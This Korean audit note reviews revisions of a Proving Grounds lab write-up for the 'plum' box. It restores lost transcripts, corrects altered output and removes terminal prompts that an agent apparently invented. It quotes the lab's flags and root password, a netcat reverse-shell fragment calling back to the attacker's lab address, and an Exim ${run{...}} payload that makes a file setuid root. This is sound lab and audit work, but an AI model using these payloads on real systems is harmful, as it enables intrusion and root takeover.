---
tags:
  - type/audit
  - platform/pg
---
# plum — 적대적 검증 감사 (2026-08-26 · 웨이브 17)

대상: `03. PG\plum.md` (초판 324행 → aba5a29 1404행 → 076525b 1265행 → 작성자 개작 878행 → **정정본 937행**)
검증자 = 정정자 동일. 박스는 정지돼 재접속 불가. 타겟에 패킷을 보내지 않았음 — git 이력·`~/PG/plum/` 산출물·`파일보관\` 스크린샷·`~/.zsh_history`·1차 사료 대조 전용.

## 0. 최종 판정

**완료 2/2** — `local.txt` `26780c227fb20c4d1eb303a7536de3bd` · `proof.txt` `b0d62860a794cb90eb6ac02cee93c579`.

근거는 노트가 아니라 스크린샷이다. 두 값을 화면에서 한 글자씩 대조했다.

| 플래그 | 화면 증거 | 대화형 셸 근거 |
|---|---|---|
| `local.txt` | `Pasted image 20260629140858.png` | 타겟 pty 프롬프트 `www-data@plum:/var/www$` 가 같은 화면에 있음 |
| `proof.txt` | `Pasted image 20260629142947.png` | 프롬프트 없음. `su -` → `Password:` → `whoami` → `root` → `cat` 이 한 화면. 웹셸이 아니라 리버스셸 안에서 읽은 것은 직전 화면들이 뒷받침 |

root 비밀번호 `6s8kaZZNaZZYBMfh2YEW` 도 `…142856.png` 에서 한 글자씩 대조 — 일치.

## 1. 가장 큰 발견 — 실측 115줄이 «작성자 이전 웨이브»에서 사라져 있었고 아무도 몰랐다

초판(git `15671e5`)의 `cat /var/spool/mail/www-data` 전사는 **mbox 메시지 3통 전문**이었다. 현재 노트에는 1통만 남아 있었다. 사라진 2통은 **공격자 자신이 만든 것**이다.

```text
X-Failed-Recipients: debian@localhost
...
  debian@localhost
    (generated from root@localhost)
    Unrouteable address
...
localhost : Jun 29 04:57:06 : www-data : 1 incorrect password attempt ; PWD=/tmp ; USER=root ; COMMAND=list
localhost : Jun 29 05:12:46 : www-data : 1 incorrect password attempt ; PWD=/tmp ; USER=root ; COMMAND=list
```

**소실 시점은 `aba5a29`** — 이번 작성자가 아니다. `grep -c MAILER-DAEMON` 결과: `orig.md 2` · `aba.md 0` · `prev.md 0`. 즉 첫 개작 웨이브에서 통째로 빠졌고 이후 두 번의 개작·감사가 전부 못 잡았다.

### 파급 ① — 노트가 이미 «관측된» 사실을 `[가정]` 으로 강등하고 있었다

정정 전 「남긴 흔적」 절:

> **[가정]** 반송 경로의 구체적 원인(별칭 미해결 등)은 산출물로 확인되지 않았다

**틀렸다.** `debian@localhost` 도 `Unrouteable address` 도 초판 전사에 그대로 있다. 강등을 풀고 인과를 확정형으로 되돌렸다.

### 파급 ② — 🔴 `_AUDIT\plum-playbook.md` 가 같은 오류를 담은 채 `_PLAYBOOK` 으로 반영 중이다

`03. PG\_AUDIT\plum-playbook.md:348`:

> `Unrouteable address` 라는 특정 에러나 `debian@localhost` 라는 특정 별칭은 **어떤 산출물에도 없다.**

같은 파일 `:344` 는 두 `sudo` 시각을 두고 *"완전한 날조는 아니라고 볼 근거가 있다"* 며 정황으로 방어하고 있다. **정황이 필요 없다 — 축자 전사가 git 에 있다.**

이 파일은 총괄이 `_PLAYBOOK.md` 로 반영 중이므로 **감사자가 손대지 않았다.** 총괄 판단 필요.

### 파급 ③ — 「기록 없는 57분」의 절반이 설명된다

`plum-playbook.md:198` 은 13:00:31 → 13:57:06 의 57분을 *"산출물이 하나도 없음(원인 미상, `[가정]` 조차 못 붙임)"* 으로 적었다. 두 `sudo` 시각을 KST 로 환산하면 **13:57:06 · 14:12:46** — 그 구간 끝에서 `sudo -l` 을 두 번 시도했고 `www-data` 에 비밀번호가 없어 둘 다 실패했다는 것이 확정된다. `COMMAND=list` 가 `sudo -l` 이다.

## 2. 고친 것

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 |
|---|---|---|
| `drwxrwxr-x  2 root     mail 4096 Jun 29 01:12 .` | **실측 바이트 개변.** 초판은 `drwxrw**s**r-x`(setgid). `s`→`x` 로 바뀌어 있었음. `aba5a29` 기원 | `drwxrwsr-x` 로 복원 |
| 메일함 `ls` 전사 | `cd www-data` / `/tmp/pwned: 8: cd: can't cd to www-data` / 두 번째 `ls` 가 삭제돼 있었음. **노트 본인이 「남긴 흔적」에서 이 줄을 근거로 인용하면서** 정작 원문을 지운 상태 | 3줄 복원 + 접두사 `/tmp/pwned:` 의 의미를 산문으로 명시 |
| 메일함 본문 절 | 반송 메일 2통 전량 소실 | 발췌(`...` 표시)로 복원 + 읽는 법 3항목(=`sudo -l` 실패 / 별칭 미해결 / mtime 출처 확정) |
| `[가정]` 반송 경로 | 관측된 것을 강등 | 강등 해제, 인과 확정 |
| `# Nmap 7.98 scan initiated …` / `# Nmap done at …` | **합성 블록.** `┌──(kali㉿kali)` 프롬프트 아래에 «파일(`nmap.log`) 본문»이 붙어 있었음 — 그 텍스트가 화면에 뜬 적이 없다 | 초판이 보존한 진짜 stdout(`Starting Nmap …` / `Nmap done: …`)으로 되돌리고 캡션에 파일 사본과의 차이를 명시. 프롬프트는 `~/.zsh_history:1232` 로 실측 확인돼 **유지** |
| `┌──(kali㉿kali)-[~]` + `php -r 'var_dump(realpath(...`  | **창작 프롬프트.** `var_dump` 가 `~/.zsh_history` 에 0건 — 에이전트가 비대화형 `ssh` 로 돌린 것 | `ssh kali@10.44.44.128 "…"` 실호출 형태 + 출력 분리. **감사자가 재실행해 출력 일치 확인** |
| `┌──(kali㉿kali)-[~/PG/plum/pluxml-rce]` + `git status --porcelain` | 창작 프롬프트(`porcelain` 0건) + 펜스 안 한국어 주석 2줄 | 실호출 형태로 교체, 주석은 펜스 밖으로. **재실행해 빈 출력·`.gitignore` 의 `*.swp` 확인** |
| `┌──(kali㉿kali)-[~]` + `setsid … su root` | 창작 프롬프트(`setsid`·`must be run from a terminal` 0건) + 펜스 안 한국어 `← 동작한다` | 실호출 형태 + 출력 분리 + 「사후 재현임」 명시. **재실행해 `su: Authentication failure` / `su from util-linux 2.41.2` / `strings` 무출력 확인** |
| `한 번 실수하면 그 세션의 모든 폼이 죽어 로그인부터 다시 해야 함` | **소스로 반증.** `unset($_SESSION['formtoken'])` 후에는 `isset()` 이 거짓이라 다음 POST 가 검증 블록을 통째로 건너뛰고, 화면 재요청 시 `getTokenPostMethod()` 가 새 토큰을 발급. 재로그인 불필요 | 반증 내용으로 교체 + 복구 방법 명시 |
| `getTokenPostMethod` 인용 | 상류 원문은 5줄 `substr(\n…\n)` 인데 1줄로 재포맷돼 있었음 | v5.8.7 원문 형태로 복원 |
| `validateFormToken` 인용 | 감싸는 `if($_SERVER['REQUEST_METHOD']…)` · `$limit` 행이 잘려 조건 성립 근거가 안 보였음 + 한국어 주석 `// ← 소비 즉시 폐기` 삽입 | 상류 원문 그대로 확장, 주석 제거 |
| `// PROFIL_ADMIN = 0, 관리자 전용` · `// ← ★ 폴백` · `// ← ★ 재계산` | 인용 소스에 없는 주석 삽입 | 제거. `PROFIL_ADMIN = 0` 은 표 셀로 이동(출처 `core/lib/config.php:35` 확인) |
| `v5.8.7 원문(605행부터)` | 파일:행번호 = 깊이 기준 초과(소스 고고학) | 행번호 삭제. 단 **`write()` 인용 본문은 상류와 바이트 일치 확인 — 개변 없음** |
| ` ```bash $ git diff v5.8.7 v5.8.23 … ` | 펜스 안 한국어 요약(`... (top.php · foot.php 도 같은 형태)`)으로 실제 출력을 대체 | 실제 `diff` 3-hunk 출력으로 교체. **직접 대조: v5.8.7 ≡ v5.8.16 (양쪽 3606B, 바이트 동일) · v5.8.23 3576B, 차이 3줄** |
| `nc 192.168.45.156 4444 >/tmp/f` | `>` 앞 공백이 추가돼 `pluxml.py` 원문과 불일치(같은 노트 다른 절의 인용과 자기모순) | `4444>/tmp/f` 로 정정 + 원문 형태 캡션 |
| README 인용 4줄 | 빈 줄 제거 + **PDF URL 1줄 절단**(발견자 원 보고서 링크). 무표시 절단 | 228바이트 전문으로 복원 |
| `228바이트짜리 4줄 문서` | 실측 `wc -lc` = 228바이트 / 7줄(내용 5줄) | `228바이트·7줄(내용 5줄)` |
| 스크린샷 12장 | `Pasted image 20260629130002.png`(pluxml.py 성공 실행 전체 화면) 미사용 | 실행 결과 펜스 뒤에 추가 → **13장** |
| 메일함 근거등급 콜아웃 | `초판의 터미널 기록에서 옮긴 것이고 산출물로 재검증되지 않음` — 「출처 불명」처럼 읽힘 | 「볼트 git 최초 스냅샷에 보존된 동시대 전사」로 출처 명시. `[가정]` 등급 자체는 유지 |

## 3. 반증한 것 — 지적으로 올랐다가 노트가 옳았던 것

1. **🔴 지시 ⓓ 「354행 `### PluXml 5.8.7 RCE` 헤딩이 골격 밖에서 새어나왔다」 — 틀렸다.** 그 줄은 ` ```text ` 펜스 **안**에 있는 README 인용문이다. 마크다운 헤딩이 아니다. 펜스 인식 파서로 전수 확인: 실제 헤딩은 `## Target #1` · `### Initial Access`×2 · `### Service Enumeration` · `### Privilege Escalation` · `### Post-Exploitation` · `## 관련` 뿐이고 **표준 골격과 정확히 일치**한다. (같은 이유로 `# Traitement du formulaire` · `# Contrôle du template` · `# 또는` 도 펜스 안이다.)
2. **지시 ⓐ 「Initial Access 가 Service Enumeration 앞에 있는 것이 순서 오류」로 볼 뻔했다 — 아니다.** `_WRITEUP-STANDARD.md:97-114` 의 템플릿이 **정확히 그 순서**(긴 제목 4항목 → Service Enumeration → 짧은 제목 재현)를 규정한다. 4항목은 두 절 모두 완비(각 4/4).
3. **「master 에서 `home.php` 폴백이 사라졌다」가 틀린 줄 알았다 — 노트가 옳다.** master 에도 `$tpl = $aTemplates[0];` 폴백이 있으나 그것은 **POST 가 없는 최초 진입 분기 전용**이고, `load`/`save` 경로는 `in_array` 실패 시 `exit` 한다. 소스 실측(`master/core/admin/parametres_edittpl.php:110-127`)으로 확인.
4. **nmap raw 블록의 중간 절단은 없었다.** `nmap.log`(1392B) 본문과 노트 블록을 대조 — 스캔 결과 27줄 전부 일치, 유일한 차이는 `| ssh-hostkey:` 뒤 **행말 공백 1자**(노트가 strip)와 위에 적은 첫·끝 줄 형식. `22/tcp open` · `80/tcp open` 행 보존 → `extract.py PORT_RE` 정상.
5. **`sudoers(5) 기본값 OFF` 주장은 맞다.** Kali 에서 `man 5 sudoers` 직접 확인 — *"mail_badpass … This flag is off by default."*
6. **`plxUtils::write()` 인용은 상류 v5.8.7 과 바이트 일치.** 탭·프랑스어 주석까지 그대로. 개변 없음.
7. **`┌──(kali㉿kali)` 10개는 전부 남겼다.** `~/.zsh_history:1231-1236` 에 `nnmap 192.168.132.28` · `git clone …pluxml-rce.git` · `vi pluxml.py` · `python pluxml.py http://192.168.132.28/ admin admin 192.168.45.156 4444` 가 축자로 존재 = **대화형 세션 실측**. 지운 것은 위 표의 3개(에이전트 사후 재현)뿐이다.
8. **타겟 pty 프롬프트 `www-data@plum:…$` 는 한 줄도 건드리지 않았다.** 플래그 판정의 유일한 근거다.
9. **작성자 자기신고 2건은 실제로 노트에 반영돼 있었다.** ⑴ SUID 절의 `Pasted image 20260629142105.png` 삽입 — 화면을 직접 열어 `find / -perm -u=s 2>/dev/null` 명령줄과 15개 경로가 노트 펜스와 일치함을 확인, `[가정]`→실측 승격이 정당하다. ⑵ 「평문 에코 = TTY 부재 증거」 폐기 후 `cannot set terminal process group`·`no job control` 로 근거 교체 — 반영 확인.

## 4. 삭제하고 되살리지 않은 것 (원문 인용 — 되살릴 수 있다)

이번 작성자가 `076525b`(1265행)에서 지웠고 `plum-playbook.md` 에도 안 들어간 유일한 덩어리는 **CVE-2019-10149 의 소스 수준 해설**이다. 감사자는 **깊이 기준(소스 고고학 = 과잉)에 따라 복원하지 않기로 판단**했다. 오답 경로였고, 판정에 필요한 사실(`46996` = `raptor_exim_wiz`, 취약 4.87–4.91, 타겟 4.94.2 = 비취약)은 노트에 남아 있으며 Qualys 원 어드바이저리 링크도 `## 관련` 에 있다.

지운 원문:

```text
실패했지만 이 CVE가 원래 왜 root가 되는지는 유형으로 배워둘 값어치가 있다. 취약 코드는 `src/deliver.c` 의 `deliver_message()` 다.

if (process_recipients != RECIP_ACCEPT)
deliver_localpart = expand_string(
string_sprintf("${local_part:%s}", new->address));

`new->address` 는 메일 수신자 주소, 즉 공격자가 정하는 값이다. 그것이 `string_sprintf` 로 확장 템플릿 문자열에 문자 그대로 삽입되고 `expand_string()` 이 그 결과를 해석한다. Exim의 확장 문법에는 `${run{<명령>}}` 이 있다 — 명령을 실행하는 항목이다.

> "A delivery process retains root privilege throughout most of its execution., including while the recipient addresses in a message are being routed."

*(`execution.,` 의 마침표+쉼표는 Exim 공식 문서 원문의 오타다. 축자 인용이므로 고치지 않고 그대로 옮긴다.)*

PAYLOAD_SETUID='${run{\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fpwned\x3bchmod\t4755\t\x2ftmp\x2fpwned\x22}}@localhost'

`\x2f` = `/`, `\t` = 공백 대용, `\x22` = `"`, `\x3b` = `;`.
```

그 외 `prev.md → 현재` 의 diff 에서 「사라진」 것으로 잡힌 190줄은 **전수 확인 결과 개조식 재작성이거나 `plum-playbook.md` 에 이관된 것**이었다. 실질 손실은 위 한 덩어리뿐이다.

## 5. 색인

- `manual_tags: true` · `manual_cves: true` 선언 유지 확인. 두 줄 모두 값 뒤 주석 없음.
- `tech_count: 4` ↔ `tech/*` 4개 일치. 넷 다 실제 사용 기법이다 — `default-creds`(admin/admin) · `code-injection`(템플릿에 PHP 기록) · `payload/revshell`(mkfifo+nc) · `cred/reuse`(메일함 비밀번호 → `su -`).
- `cves: [CVE-2024-48138]` — 정본 맞다. CVE-2022-25018 · CVE-2024-22636 · CVE-2019-10149 는 본문에서 **전부 「이 박스가 아닌 것」 맥락**(PoC 저자의 오표기 / 재발 사례 / 오답 경로)으로만 등장하며 프론트매터에 없다.
- **색인 갱신 필요** — 본문이 878→937행으로 바뀌었다. `refresh.ps1` 은 공유 인프라라 감사자가 돌리지 않았다.

## 6. 근거 출처

- git: `15671e5`(초판 324행, **소실 실측의 유일한 보관처**) · `aba5a29` · `076525b`
- Kali 산출물: `~/PG/plum/nmap.log`(1392B, md5 `51c3978ebaf1a85de73fb13efaeaaab9`) · `46996`(3557B, mtime 14:23:56) · `pluxml-rce/pluxml.py`(4251B) · `pluxml-rce/README.md`(228B)
- `~/.zsh_history` — plum 3건 · pluxml 9건(1231-1236, 1249-1253) · `searchsploit exim4`·`vi 46996`(1246-1247)
- 스크린샷 13장(`Pasted image 2026062912:50:57` ~ `14:29:47`) — `130002` · `142856` · `142834` · `142105` · `142947` · `140858` 을 **직접 열어** 대조
- 1차 사료(Kali 에서 직접 `curl`): PluXml `v5.8.7`·`v5.8.16`·`v5.8.23`·`master` 의 `core/admin/parametres_edittpl.php`, `v5.8.7` 의 `core/lib/class.plx.utils.php`·`class.plx.token.php`·`core/lib/config.php`
- Kali 직접 실행: `php -r 'var_dump(realpath(...))'` · `setsid sh -c 'echo wrongpw | su root'` · `strings $(readlink -f /bin/su) | grep …` · `su --version` · `man 5 sudoers` · `git status --porcelain`·`git diff --stat` in `~/PG/plum/pluxml-rce` · `diff` of the four PluXml tags
